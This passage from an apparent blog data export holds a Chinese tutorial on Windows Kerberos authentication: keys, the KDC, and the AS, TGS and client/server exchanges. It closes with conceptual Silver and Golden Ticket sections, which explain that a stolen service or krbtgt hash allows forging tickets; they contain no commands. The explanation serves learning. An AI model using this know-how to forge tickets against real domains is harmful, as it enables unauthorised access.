Key`解密被Client加密的鉴别码，获得Client信息、时间戳等信息。\n\n过程与`KRB_TGS_REP`阶段差不多，不再赘述。\n\n但有一点是，\n\n如果Client需要进行双向验证，Server从鉴别码中提取时间戳，使用`K(c,s)`进行加密，并将其发送给Client用于Client验证Server的身份。\n\n### 白银票据（Silver Tiket）\n\n通过前面我们已经知道Kerberos的认证大致流程，在第三阶段认证的`KRB_AP_REQ`时，Client拥有两份加密的`Session Key`，`K（c,s）`分别是：\n\n> - 用自己`NTLM Hash`加密的`Session Key`。\n> - 用Server的`NTLM Hash`加密的Tiket。\n\nTiket只有Server可以解密，这是因为Tiket是使用Server的`NTLM Hash`进行加密的。但是这也意味着如果我们拥有Server的Hash，那么意味着我们可以解密以及伪造Tiket，从而绕过KDC直接进行验证。\n\n### 黄金票据（Golden Tiket）\n\n通过前面我们已经知道Kerberos的认证大致流程，在第二阶段认证的`KRB_AS_REQ`时，Client拥有两份加密的`Session Key`，`K（c,tgs）`分别是：\n\n> - 用自己`NTLM Hash`加密的`Session Key`。\n> - 用`krbtgt`用户的`NTLM Hash`加密的TGT。\n\n前面我们说过，TGT只有KDC可以解密，这是因为TGT是使用`krbtgt`用户的`NTLM Hash`进行加密的，而该Hash只有KDC知道。但是这也意味着如果我们拥有`krbtgt`用户的Hash，那么意味着我们可以解密以及伪造TGT，\n\n**参考资料：**\n\nhttps://blog.csdn.net/lengxiao1993/article/details/20458809\n\nhttps://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB---kerbroes\n\nhttps://klionsec.github.io/2016/08/10/ntlm-kerberos/?tdsourcetag=s_pcqq_aiomsg\n\nhttps://blog.csdn.net/wulantian/article/details/42418231","slug":"02-Windows认证之Kerberos","published":1,"updated":"2019-04-04T01:06:07.258Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83my005w7or06n4ta6ph","content":"<h3 id=\"0x00-Kerberos\"><a href=\"#0x00-Kerberos\" class=\"headerlink\" title=\"0x00 Kerberos\"></a>0x00 Kerberos</h3><p><img src=\"/2019/04/03/02-Windows认证之Kerberos/cerberus.jpg\" alt></p>\n<p>Kerberos起源于希腊神话，是一只守护着冥界长着3个头颅的神犬，在Kerberos认证中，Kerberos的3个头颅也代表认证过程中涉及的三方：Client、Server、KDC。</p>\n<p>Kerberos是一种网络认证协议，它允许某实体在非安全网络环境下，向另一个实体以一种安全的方式证明自己的身份。</p>\n<p>Windows的AD域环境使用Kerberos来进行验证。</p>\n<a id=\"more\"></a>\n<h3 id=\"0x01-Long-term-Key与Short-term-Key\"><a href=\"#0x01-Long-term-Key与Short-term-Key\" class=\"headerlink\" title=\"0x01 Long-term Key与Short-term Key\"></a>0x01 Long-term Key与Short-term Key</h3><p>在 Security 领域中，有的密钥可能长期保持不变，比如你的密码，可能几年都不曾改变，这样的 Key 被称为 <code>Long-term Key</code>。</p>\n<p>使用<code>Long-term Key</code>应该有以下原则：</p>\n<blockquote>\n<p>1.被<code>Long-term Key</code>加密的数据包不应在网络中传输，或者说不要用<code>Long-term Key</code>加密数据包。原因在于如果加密的数据包被攻击者抓包截取，那么只要时间充足，密钥被爆破出来的风险是很大的。</p>\n<p>2.<code>Long-term Key</code>不应该使用明文方式存储，好的方法是用摘要算法计算其Hash值，从而保存Hash值。因为我们知道Hash算法是不可逆的，且不同输入计算出来的Hash是不同的，因此理论上拥有Hash值是不可能逆向破解获得明文Key，除非进行Hash碰撞，即对Hash算法尝试不同的输入，然后将算法输出Hash值与我们要破解的Hash值对比，本质是暴力破解。</p>\n</blockquote>\n<p>我们一般会使用 <code>Short-term Key</code> 来加密需要进行网络传输的数据。顾名思义，这种 Key 只在短时间内有效，因此即使被加密的数据包被黑客截获，等他把 Key 计算出来的时候，这个 Key 也早就已经失效了。</p>\n<p>由此我们也引出一个问题：</p>\n<p>我们知道加密通信数据应该使用<code>Short-term Key</code>，但是<code>Short-term Key</code>作为一个短期有效的密钥，其管理分发是一个问题，即通信双方该如何即安全又便捷的协商出一个只有双方知道的<code>Short-term Key</code>呢？</p>\n<p>Kerberos认证的第一阶段和第二阶段其实就是协商出通信所需的<code>Short-term Key</code>的过程。</p>\n<p>在Kerberos认证中，<code>Short-term Ke</code>被称为<code>Session Key</code>。而Windows用户的密码就是我们前面说的<code>Long-term Key</code>，它以<code>NTLM Hash</code>方式存储在服务器中。</p>\n<h3 id=\"0x02-KDC-Key-Distribution-Center\"><a href=\"#0x02-KDC-Key-Distribution-Center\" class=\"headerlink\" title=\"0x02 KDC(Key Distribution Center)\"></a>0x02 KDC(Key Distribution Center)</h3><p>KDC(Key Distribution Center)，即密钥分发中心，作为第三方信任机构为C/S提供认证。</p>\n<p>担任KDC的角色在物理层面上与DC(Domain Controller)，即域控所属同一主机。</p>\n<p>KDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下部分组成：</p>\n<blockquote>\n<ul>\n<li>AS（Authentication Service）：主要用于生成Client与TGS通信的<code>Session Key</code>，记<code>K(c,tgs)</code>以及TGT。</li>\n<li>TGS（Ticket Granting Service）：主要用于生成Client与Server通信的<code>Session Key</code>，记<code>K(c,s)</code>以及Tiket。</li>\n</ul>\n</blockquote>\n<p>AD(Account Database)，它作为账户管理数据库，用与存储用户认证信息，即密码的<code>NTLM Hash</code>等。</p>\n<h3 id=\"0x03-Kerberos认证大致流程\"><a href=\"#0x03-Kerberos认证大致流程\" class=\"headerlink\" title=\"0x03 Kerberos认证大致流程\"></a>0x03 Kerberos认证大致流程</h3><p><img src=\"/2019/04/03/02-Windows认证之Kerberos/1070321-20180417175541960-360210611.png\" alt></p>\n<p>第一阶段（AS Exchange）：生成一个用于加密Client与TGS的通信的<code>Session Key</code>。</p>\n<blockquote>\n<p>生成<code>K(c,tgs)</code>的两份Copy，一份加密用于给Client，一份加密为TGT用于给TGS（但先发给Client，让其发给TGS）。</p>\n</blockquote>\n<p>第二阶段（TGS Exchange）：生成一个用于加密Client与Server通信的<code>Session Key</code>。</p>\n<blockquote>\n<p>生成<code>K(c,s)</code>的两份Copy，一份加密用于给Client，一份加密为Tiket用于给Server（但先发给Client，让其发给Server）。</p>\n</blockquote>\n<p>第三阶段（CS EXchange）：Client与Server之间验证并使用<code>K(c,s)</code>加密通信。</p>\n<h3 id=\"0x04-Kerberos认证第一阶段：Authentication-Service-Exchange\"><a href=\"#0x04-Kerberos认证第一阶段：Authentication-Service-Exchange\" class=\"headerlink\" title=\"0x04 Kerberos认证第一阶段：Authentication Service Exchange\"></a>0x04 Kerberos认证第一阶段：Authentication Service Exchange</h3><p><img src=\"/2019/04/03/02-Windows认证之Kerberos/QQ截图20190403201648.png\" alt></p>\n<p><strong>KRB_AS_REQ</strong></p>\n<p>首先，客户端发送请求给KDC AS，请求消息包含以下三部分：</p>\n<blockquote>\n<ul>\n<li><code>Pre-authentication data</code>：用以证明Client身份的信息，它的内容是一般是被Client的<code>NTLM Hash</code>加密的 <code>Timestamp</code>。</li>\n<li><code>Client name &amp; realm</code>：Client自身信息，简单地说就是 <code>DomainName\\Username</code>，KDC AS用其查找AD数据库看用户是否存在。</li>\n<li><code>Server Name</code>：注意这里的ServerName并不是Client实际想要通信的Server，而是KDC TGS服务器的名称。</li>\n</ul>\n</blockquote>\n<p><strong>KRB_AS_REP</strong></p>\n<p>KDC收到请求消息后，根据提供的用户名在<code>AD(Account Database)</code>中寻找是否存在。</p>\n<p>若存在，则将产生一个<code>Session Key</code>，记<code>K(c,tgs)</code>，并且将其生成两份Copy，分别用于给Client和KDC TGS。</p>\n<p>对于给Client的那份<code>Session Key</code>，KDS AS会从<code>AD(Account Database)</code>中获取Client的<code>NTLM Hash</code>对其进行加密。</p>\n<p>对于给KDC TGS的那份<code>Session Key</code>，KDS AS会从<code>AD(Account Database)</code>中获取<code>krbtgt</code>用户的<code>NTLM Hash</code>对其及其它信息进行加密，称为TGT（Ticket Granting Ticket）。</p>\n<blockquote>\n<ul>\n<li>TGT中除了<code>Session Key</code>，还包括一些Client的用户名（DomainName\\Username）、End time（TGT 到期的时间）等信息。</li>\n<li><code>krbtgt</code>用户是在新建一台域控制器时，由系统自动创建使得，用于Kerberos认证用的。因此TGT只有KDC能解密。</li>\n</ul>\n</blockquote>\n<p>虽然产生的TGT是用于给KDC TGS的，但是KDC还是会把两份都发给Client，KDC TGS那份由Client发给KDC TGS。之所以这样做的目的是：</p>\n<blockquote>\n<ul>\n<li>首先Server不用维护一张庞大的会话密钥列表来应付不同的Client的访问，降低了Server的负荷；</li>\n<li>其次避免出现因为网络延时，Client的认证请求比Server的会话密钥早到达Server端，进而导致认证失败的情况。</li>\n</ul>\n</blockquote>\n<h3 id=\"0x05-Kerberos认证第二阶段：Ticket-Granting-Service-Exchange\"><a href=\"#0x05-Kerberos认证第二阶段：Ticket-Granting-Service-Exchange\" class=\"headerlink\" title=\"0x05 Kerberos认证第二阶段：Ticket Granting Service Exchange\"></a>0x05 Kerberos认证第二阶段：Ticket Granting Service Exchange</h3><p><img src=\"/2019/04/03/02-Windows认证之Kerberos/QQ截图20190403202909.png\" alt></p>\n<p><strong>KRB_TGS_REQ</strong></p>\n<p>根据前面我们可以知道，此时Client拥有两份加密的<code>Session Key</code>，分别是</p>\n<blockquote>\n<ul>\n<li>用自己<code>NTLM Hash</code>加密的<code>Session Key</code>。</li>\n<li>用<code>krbtgt</code>用户的<code>NTLM Hash</code>加密的TGT。</li>\n</ul>\n</blockquote>\n<p>首先，Client会使用自己的<code>NTLM Hash</code>解密属于自己的那份，解密后获得<code>Session Key</code>。</p>\n<p>接着，Client会生成鉴别码（Authenticator），并使用<code>Session Key</code>对鉴别码进行加密。</p>\n<blockquote>\n<p>鉴别码实际主要是Client的信息（DomainName\\Username）、ServerName(DomainName\\Server)以及当前时间的时间戳。</p>\n<p>此处的ServerName是Client真正想访问的Server。</p>\n<p>鉴别码的作用主要是为了证明该消息是Client自己发的。</p>\n</blockquote>\n<p>最后，Client将加密的鉴别码与TGT发给KDC TGS。</p>\n<p><strong>KRB_TGS_REP</strong></p>\n<p>KDC TGS收到消息后，先使用自己（krbtgt）的<code>NTLM Hash</code>对TGT进行解密，获得<code>Session Key</code>、Client信息、TGT过期时间等信息。</p>\n<p>然后使用<code>Session Key</code>解密被Client加密的鉴别码，获得Client信息、时间戳等信息。</p>\n<p>比对两次解密得到的时间戳，确保在可允许的范围。</p>\n<p>时间同步的重要性：</p>\n<blockquote>\n<p>我们知道不管是Session Key还是票据都是有时效性的，TGT通常是8个小时，时效性的判断主要是用数据包传递的时间戳（Timestamp）与本地的时间做比较，因此Client、Server、KDC三者的时间同步是很重要，否则可能会造成验证失败，通常它们都需要配置从同一时间服务器同步时间。</p>\n</blockquote>\n<p>验证通过后，KDC TGS会生成一个<code>Session Key</code>，记<code>K(c,s)</code>，该<code>Session Key</code>用于给Client和Server通信使用。</p>\n<p>将<code>K(c,tgs)</code>加密<code>K(c,s)</code>，用于给Client。</p>\n<p>同时也会生成一个Tiket用于给Server，并用Server的<code>NTLM Hash</code>加密该Tiket。Tiket包含：</p>\n<blockquote>\n<ul>\n<li>用于给Client和Server通信使用<code>Session key</code>，即<code>K(c,s)</code>。</li>\n<li>Client的一些信息，如用户名。</li>\n<li>Tiket过期时间。</li>\n</ul>\n</blockquote>\n<p>可以发现这个阶段与上一个阶段是类似，KDC同样会把这两份加密了的<code>Session Key</code>都发给Client。</p>\n<h3 id=\"0x06-Kerberos认证第三阶段：Client-Server-Exchange\"><a href=\"#0x06-Kerberos认证第三阶段：Client-Server-Exchange\" class=\"headerlink\" title=\"0x06 Kerberos认证第三阶段：Client/Server Exchange\"></a>0x06 Kerberos认证第三阶段：Client/Server Exchange</h3><p><strong>KRB_AP_REQ</strong></p>\n<p>此时Client同样拥有两份加密的<code>Session Key</code>，<code>K(c,s)</code>。分别是</p>\n<blockquote>\n<ul>\n<li>用自己<code>NTLM Hash</code>加密的<code>Session Key</code>。</li>\n<li>用Server的<code>NTLM Hash</code>加密的Tiket。</li>\n</ul>\n</blockquote>\n<p>接着Client会使用自己的<code>NTLM Hash</code>解密属于自己的那份，解密后获得<code>K(c,s)</code>。</p>\n<p>使用<code>K(c,s)</code>加密鉴别码，将加密的鉴别码同Tiket发给服务器。</p>\n<p><strong>KRB_AP_REP</strong></p>\n<p>Server收到消息后，先使用自己的<code>NTLM Hash</code>对Tiket进行解密，获得<code>Session Key</code>、Client信息、TGT过期时间等信息。</p>\n<p>然后使用<code>Session Key</code>解密被Client加密的鉴别码，获得Client信息、时间戳等信息。</p>\n<p>过程与<code>KRB_TGS_REP</code>阶段差不多，不再赘述。</p>\n<p>但有一点是，</p>\n<p>如果Client需要进行双向验证，Server从鉴别码中提取时间戳，使用<code>K(c,s)</code>进行加密，并将其发送给Client用于Client验证Server的身份。</p>\n<h3 id=\"白银票据（Silver-Tiket）\"><a href=\"#白银票据（Silver-Tiket）\" class=\"headerlink\" title=\"白银票据（Silver Tiket）\"></a>白银票据（Silver Tiket）</h3><p>通过前面我们已经知道Kerberos的认证大致流程，在第三阶段认证的<code>KRB_AP_REQ</code>时，Client拥有两份加密的<code>Session Key</code>，<code>K（c,s）</code>分别是：</p>\n<blockquote>\n<ul>\n<li>用自己<code>NTLM Hash</code>加密的<code>Session Key</code>。</li>\n<li>用Server的<code>NTLM Hash</code>加密的Tiket。</li>\n</ul>\n</blockquote>\n<p>Tiket只有Server可以解密，这是因为Tiket是使用Server的<code>NTLM Hash</code>进行加密的。但是这也意味着如果我们拥有Server的Hash，那么意味着我们可以解密以及伪造Tiket，从而绕过KDC直接进行验证。</p>\n<h3 id=\"黄金票据（Golden-Tiket）\"><a href=\"#黄金票据（Golden-Tiket）\" class=\"headerlink\" title=\"黄金票据（Golden Tiket）\"></a>黄金票据（Golden Tiket）</h3><p>通过前面我们已经知道Kerberos的认证大致流程，在第二阶段认证的<code>KRB_AS_REQ</code>时，Client拥有两份加密的<code>Session Key</code>，<code>K（c,tgs）</code>分别是：</p>\n<blockquote>\n<ul>\n<li>用自己<code>NTLM Hash</code>加密的<code>Session Key</code>。</li>\n<li>用<code>krbtgt</code>用户的<code>NTLM Hash</code>加密的TGT。</li>\n</ul>\n</blockquote>\n<p>前面我们说过，TGT只有KDC可以解密，这是因为TGT是使用<code>krbtgt</code>用户的<code>NTLM Hash</code>进行加密的，而该Hash只有KDC知道。但是这也意味着如果我们拥有<code>krbtgt</code>用户的Hash，那么意味着我们可以解密以及伪造TGT，</p>\n<p><strong>参考资料：</strong></p>\n<p><a href=\"https://blog.csdn.net/lengxiao1993/article/details/20458809\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/lengxiao1993/article/details/20458809</a></p>\n<p><a href=\"https://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB---kerbroes\" target=\"_blank\" rel=\"noopener\">https://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB---kerbroes</a></p>\n<p><a href=\"https://klionsec.github.io/2016/08/10/ntlm-kerberos/?tdsourcetag=s_pcqq_aiomsg\" target=\"_blank\" rel=\"noopener\">https://klionsec.github.io/2016/08/10/ntlm-kerberos/?tdsourcetag=s_pcqq_aiomsg</a></p>\n<p><a href=\"https://blog.csdn.net/wulantian/article/details/42418231\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/wulantian/article/details/42418231</a></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-Kerberos\"><a href=\"#0x00-Kerberos\" class=\"headerlink\" title=\"0x00 Kerberos\"></a>0x00 Kerberos</h3><p><img src=\"/2019/04/03/02-Windows认证之Kerberos/cerberus.jpg\" alt></p>\n<p>Kerberos起源于希腊神话，是一只守护着冥界长着3个头颅的神犬，在Kerberos认证中，Kerberos的3个头颅也代表认证过程中涉及的三方：Client、Server、KDC。</p>\n<p>Kerberos是一种网络认证协议，它允许某实体在非安全网络环境下，向另一个实体以一种安全的方式证明自己的身份。</p>\n<p>Windows的AD域环境使用Kerberos来进行验证。</p>","more":"<h3 id=\"0x01-Long-term-Key与Short-term-Key\"><a href=\"#0x01-Long-term-Key与Short-term-Key\" class=\"headerlink\" title=\"0x01 Long-term Key与Short-term Key\"></a>0x01 Long-term Key与Short-term Key</h3><p>在 Security 领域中，有的密钥可能长期保持不变，比如你的密码，可能几年都不曾改变，这样的 Key 被称为 <code>Long-term Key</code>。</p>\n<p>使用<code>Long-term Key</code>应该有以下原则：</p>\n<blockquote>\n<p>1.被<code>Long-term Key</code>加密的数据包不应在网络中传输，或者说不要用<code>Long-term Key</code>加密数据包。原因在于如果加密的数据包被攻击者抓包截取，那么只要时间充足，密钥被爆破出来的风险是很大的。</p>\n<p>2.<code>Long-term Key</code>不应该使用明文方式存储，好的方法是用摘要算法计算其Hash值，从而保存Hash值。因为我们知道Hash算法是不可逆的，且不同输入计算出来的Hash是不同的，因此理论上拥有Hash值是不可能逆向破解获得明文Key，除非进行Hash碰撞，即对Hash算法尝试不同的输入，然后将算法输出Hash值与我们要破解的Hash值对比，本质是暴力破解。</p>\n</blockquote>\n<p>我们一般会使用 <code>Short-term Key</code> 来加密需要进行网络传输的数据。顾名思义，这种 Key 只在短时间内有效，因此即使被加密的数据包被黑客截获，等他把 Key 计算出来的时候，这个 Key 也早就已经失效了。</p>\n<p>由此我们也引出一个问题：</p>\n<p>我们知道加密通信数据应该使用<code>Short-term Key</code>，但是<code>Short-term Key</code>作为一个短期有效的密钥，其管理分发是一个问题，即通信双方该如何即安全又便捷的协商出一个只有双方知道的<code>Short-term Key</code>呢？</p>\n<p>Kerberos认证的第一阶段和第二阶段其实就是协商出通信所需的<code>Short-term Key</code>的过程。</p>\n<p>在Kerberos认证中，<code>Short-term Ke</code>被称为<code>Session Key</code>。而Windows用户的密码就是我们前面说的<code>Long-term Key</code>，它以<code>NTLM Hash</code>方式存储在服务器中。</p>\n<h3 id=\"0x02-KDC-Key-Distribution-Center\"><a href=\"#0x02-KDC-Key-Distribution-Center\" class=\"headerlink\" title=\"0x02 KDC(Key Distribution Center)\"></a>0x02 KDC(Key Distribution Center)</h3><p>KDC(Key Distribution Center)，即密钥分发中心，作为第三方信任机构为C/S提供认证。</p>\n<p>担任KDC的角色在物理层面上与DC(Domain Controller)，即域控所属同一主机。</p>\n<p>KDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下部分组成：</p>\n<blockquote>\n<ul>\n<li>AS（Authentication Service）：主要用于生成Client与TGS通信的<code>Session Key</code>，记<code>K(c,tgs)</code>以及TGT。</li>\n<li>TGS（Ticket Granting Service）：主要用于生成Client与Server通信的<code>Session Key</code>，记<code>K(c,s)</code>以及Tiket。</li>\n</ul>\n</blockquote>\n<p>AD(Account Database)，它作为账户管理数据库，用与存储用户认证信息，即密码的<code>NTLM Hash</code>等。</p>\n<h3 id=\"0x03-Kerberos认证大致流程\"><a href=\"#0x03-Kerberos认证大致流程\" class=\"headerlink\" title=\"0x03 Kerberos认证大致流程\"></a>0x03 Kerberos认证大致流程</h3><p><img src=\"/2019/04/03/02-Windows认证之Kerberos/1070321-20180417175541960-360210611.png\" alt></p>\n<p>第一阶段（AS Exchange）：生成一个用于加密Client与TGS的通信的<code>Session Key</code>。</p>\n<blockquote>\n<p>生成<code>K(c,tgs)</code>的两份Copy，一份加密用于给Client，一份加密为TGT用于给TGS（但先发给Client，让其发给TGS）。</p>\n</blockquote>\n<p>第二阶段（TGS Exchange）：生成一个用于加密Client与Server通信的<code>Session Key</code>。</p>\n<blockquote>\n<p>生成<code>K(c,s)</code>的两份Copy，一份加密用于给Client，一份加密为Tiket用于给Server（但先发给Client，让其发给Server）。</p>\n</blockquote>\n<p>第三阶段（CS EXchange）：Client与Server之间验证并使用<code>K(c,s)</code>加密通信。</p>\n<h3 id=\"0x04-Kerberos认证第一阶段：Authentication-Service-Exchange\"><a href=\"#0x04-Kerberos认证第一阶段：Authentication-Service-Exchange\" class=\"headerlink\" title=\"0x04 Kerberos认证第一阶段：Authentication Service Exchange\"></a>0x04 Kerberos认证第一阶段：Authentication Service Exchange</h3><p><img src=\"/2019/04/03/02-Windows认证之Kerberos/QQ截图20190403201648.png\" alt></p>\n<p><strong>KRB_AS_REQ</strong></p>\n<p>首先，客户端发送请求给KDC AS，请求消息包含以下三部分：</p>\n<blockquote>\n<ul>\n<li><code>Pre-authentication data</code>：用以证明Client身份的信息，它的内容是一般是被Client的<code>NTLM Hash</code>加密的 <code>Timestamp</code>。</li>\n<li><code>Client name &amp; realm</code>：Client自身信息，简单地说就是 <code>DomainName\\Username</code>，KDC AS用其查找AD数据库看用户是否存在。</li>\n<li><code>Server Name</code>：注意这里的ServerName并不是Client实际想要通信的Server，而是KDC TGS服务器的名称。</li>\n</ul>\n</blockquote>\n<p><strong>KRB_AS_REP</strong></p>\n<p>KDC收到请求消息后，根据提供的用户名在<code>AD(Account Database)</code>中寻找是否存在。</p>\n<p>若存在，则将产生一个<code>Session Key</code>，记<code>K(c,tgs)</code>，并且将其生成两份Copy，分别用于给Client和KDC TGS。</p>\n<p>对于给Client的那份<code>Session Key</code>，KDS AS会从<code>AD(Account Database)</code>中获取Client的<code>NTLM Hash</code>对其进行加密。</p>\n<p>对于给KDC TGS的那份<code>Session Key</code>，KDS AS会从<code>AD(Account Database)</code>中获取<code>krbtgt</code>用户的<code>NTLM Hash</code>对其及其它信息进行加密，称为TGT（Ticket Granting Ticket）。</p>\n<blockquote>\n<ul>\n<li>TGT中除了<code>Session Key</code>，还包括一些Client的用户名（DomainName\\Username）、End time（TGT 到期的时间）等信息。</li>\n<li><code>krbtgt</code>用户是在新建一台域控制器时，由系统自动创建使得，用于Kerberos认证用的。因此TGT只有KDC能解密。</li>\n</ul>\n</blockquote>\n<p>虽然产生的TGT是用于给KDC TGS的，但是KDC还是会把两份都发给Client，KDC TGS那份由Client发给KDC TGS。之所以这样做的目的是：</p>\n<blockquote>\n<ul>\n<li>首先Server不用维护一张庞大的会话密钥列表来应付不同的Client的访问，降低了Server的负荷；</li>\n<li>其次避免出现因为网络延时，Client的认证请求比Server的会话密钥早到达Server端，进而导致认证失败的情况。</li>\n</ul>\n</blockquote>\n<h3 id=\"0x05-Kerberos认证第二阶段：Ticket-Granting-Service-Exchange\"><a href=\"#0x05-Kerberos认证第二阶段：Ticket-Granting-Service-Exchange\" class=\"headerlink\" title=\"0x05 Kerberos认证第二阶段：Ticket Granting Service Exchange\"></a>0x05 Kerberos认证第二阶段：Ticket Granting Service Exchange</h3><p><img src=\"/2019/04/03/02-Windows认证之Kerberos/QQ截图20190403202909.png\" alt></p>\n<p><strong>KRB_TGS_REQ</strong></p>\n<p>根据前面我们可以知道，此时Client拥有两份加密的<code>Session Key</code>，分别是</p>\n<blockquote>\n<ul>\n<li>用自己<code>NTLM Hash</code>加密的<code>Session Key</code>。</li>\n<li>用<code>krbtgt</code>用户的<code>NTLM Hash</code>加密的TGT。</li>\n</ul>\n</blockquote>\n<p>首先，Client会使用自己的<code>NTLM Hash</code>解密属于自己的那份，解密后获得<code>Session Key</code>。</p>\n<p>接着，Client会生成鉴别码（Authenticator），并使用<code>Session Key</code>对鉴别码进行加密。</p>\n<blockquote>\n<p>鉴别码实际主要是Client的信息（DomainName\\Username）、ServerName(DomainName\\Server)以及当前时间的时间戳。</p>\n<p>此处的ServerName是Client真正想访问的Server。</p>\n<p>鉴别码的作用主要是为了证明该消息是Client自己发的。</p>\n</blockquote>\n<p>最后，Client将加密的鉴别码与TGT发给KDC TGS。</p>\n<p><strong>KRB_TGS_REP</strong></p>\n<p>KDC TGS收到消息后，先使用自己（krbtgt）的<code>NTLM Hash</code>对TGT进行解密，获得<code>Session Key</code>、Client信息、TGT过期时间等信息。</p>\n<p>然后使用<code>Session Key</code>解密被Client加密的鉴别码，获得Client信息、时间戳等信息。</p>\n<p>比对两次解密得到的时间戳，确保在可允许的范围。</p>\n<p>时间同步的重要性：</p>\n<blockquote>\n<p>我们知道不管是Session Key还是票据都是有时效性的，TGT通常是8个小时，时效性的判断主要是用数据包传递的时间戳（Timestamp）与本地的时间做比较，因此Client、Server、KDC三者的时间同步是很重要，否则可能会造成验证失败，通常它们都需要配置从同一时间服务器同步时间。</p>\n</blockquote>\n<p>验证通过后，KDC TGS会生成一个<code>Session Key</code>，记<code>K(c,s)</code>，该<code>Session Key</code>用于给Client和Server通信使用。</p>\n<p>将<code>K(c,tgs)</code>加密<code>K(c,s)</code>，用于给Client。</p>\n<p>同时也会生成一个Tiket用于给Server，并用Server的<code>NTLM Hash</code>加密该Tiket。Tiket包含：</p>\n<blockquote>\n<ul>\n<li>用于给Client和Server通信使用<code>Session key</code>，即<code>K(c,s)</code>。</li>\n<li>Client的一些信息，如用户名。</li>\n<li>Tiket过期时间。</li>\n</ul>\n</blockquote>\n<p>可以发现这个阶段与上一个阶段是类似，KDC同样会把这两份加密了的<code>Session Key</code>都发给Client。</p>\n<h3 id=\"0x06-Kerberos认证第三阶段：Client-Server-Exchange\"><a href=\"#0x06-Kerberos认证第三阶段：Client-Server-Exchange\" class=\"headerlink\" title=\"0x06 Kerberos认证第三阶段：Client/Server Exchange\"></a>0x06 Kerberos认证第三阶段：Client/Server Exchange</h3><p><strong>KRB_AP_REQ</strong></p>\n<p>此时Client同样拥有两份加密的<code>Session Key</code>，<code>K(c,s)</code>。分别是</p>\n<blockquote>\n<ul>\n<li>用自己<code>NTLM Hash</code>加密的<code>Session Key</code>。</li>\n<li>用Server的<code>NTLM Hash</code>加密的Tiket。</li>\n</ul>\n</blockquote>\n<p>接着Client会使用自己的<code>NTLM Hash</code>解密属于自己的那份，解密后获得<code>K(c,s)</code>。</p>\n<p>使用<code>K(c,s)</code>加密鉴别码，将加密的鉴别码同Tiket发给服务器。</p>\n<p><strong>KRB_AP_REP</strong></p>\n<p>Server收到消息后，先使用自己的<code>NTLM Hash</code>对Tiket进行解密，获得<code>Session Key</code>、Client信息、TGT过期时间等信息。</p>\n<p>然后使用<code>Session Key</code>解密被Client加密的鉴别码，获得Client信息、时间戳等信息。</p>\n<p>过程与<code>KRB_TGS_REP</code>阶段差不多，不再赘述。</p>\n<p>但有一点是，</p>\n<p>如果Client需要进行双向验证，Server从鉴别码中提取时间戳，使用<code>K(c,s)</code>进行加密，并将其发送给Client用于Client验证Server的身份。</p>\n<h3 id=\"白银票据（Silver-Tiket）\"><a href=\"#白银票据（Silver-Tiket）\" class=\"headerlink\" title=\"白银票据（Silver Tiket）\"></a>白银票据（Silver Tiket）</h3><p>通过前面我们已经知道Kerberos的认证大致流程，在第三阶段认证的<code>KRB_AP_REQ</code>时，Client拥有两份加密的<code>Session Key</code>，<code>K（c,s）</code>分别是：</p>\n<blockquote>\n<ul>\n<li>用自己<code>NTLM Hash</code>加密的<code>Session Key</code>。</li>\n<li>用Server的<code>NTLM Hash</code>加密的Tiket。</li>\n</ul>\n</blockquote>\n<p>Tiket只有Server可以解密，这是因为Tiket是使用Server的<code>NTLM Hash</code>进行加密的。但是这也意味着如果我们拥有Server的Hash，那么意味着我们可以解密以及伪造Tiket，从而绕过KDC直接进行验证。</p>\n<h3 id=\"黄金票据（Golden-Tiket）\"><a href=\"#黄金票据（Golden-Tiket）\" class=\"headerlink\" title=\"黄金票据（Golden Tiket）\"></a>黄金票据（Golden Tiket）</h3><p>通过前面我们已经知道Kerberos的认证大致流程，在第二阶段认证的<code>KRB_AS_REQ</code>时，Client拥有两份加密的<code>Session Key</code>，<code>K（c,tgs）</code>分别是：</p>\n<blockquote>\n<ul>\n<li>用自己<code>NTLM Hash</code>加密的<code>Session Key</code>。</li>\n<li>用<code>krbtgt</code>用户的<code>NTLM Hash</code>加密的TGT。</li>\n</ul>\n</blockquote>\n<p>前面我们说过，TGT只有KDC可以解密，这是因为TGT是使用<code>krbtgt</code>用户的<code>NTLM Hash</code>进行加密的，而该Hash只有KDC知道。但是这也意味着如果我们拥有<code>krbtgt</code>用户的Hash，那么意味着我们可以解密以及伪造TGT，</p>\n<p><strong>参考资料：</strong></p>\n<p><a href=\"https://blog.csdn.net/lengxiao1993/article/details/20458809\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/lengxiao1993/article/details/20458809</a></p>\n<p><a href=\"https://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB---kerbroes\" target=\"_blank\" rel=\"noopener\">https://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB---kerbroes</a></p>\n<p><a href=\"https://klionsec.github.io/2016/08/10/ntlm-kerberos/?tdsourcetag=s_pcqq_aiomsg\" target=\"_blank\" rel=\"noopener\">https://klionsec.github.io/2016/08/10/ntlm-kerberos/?tdsourcetag=s_pcqq_aiomsg</a></p>\n<p><a href=\"https://blog.csdn.net/wulantian/article/details/42418231\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/wulantian/article/details/42418231</a></p>"},{"title":"Win32编程基础Chapter 6：第一个窗口程序","date":"2019-04-02T01:26:59.000Z","_content":"\n#### 0x00 程序与窗口的关系 